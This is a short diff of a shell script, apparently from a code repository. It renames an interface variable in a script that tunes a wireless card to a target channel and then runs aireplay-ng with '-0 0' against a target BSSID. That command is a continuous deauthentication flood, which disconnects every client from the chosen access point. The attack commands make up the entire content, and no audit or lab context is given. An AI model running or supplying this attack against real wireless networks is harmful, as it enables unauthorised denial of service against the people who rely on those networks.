@@ -2,5 +2,5 @@
 
 source ./config.cfg
 
-iwconfig $DEVICE channel $TARGET_CHANNEL
-aireplay-ng -0 0 -a $TARGET_BSSID $DEVICE
+iwconfig $IFACE channel $TARGET_CHANNEL
+aireplay-ng -0 0 -a $TARGET_BSSID $IFACE
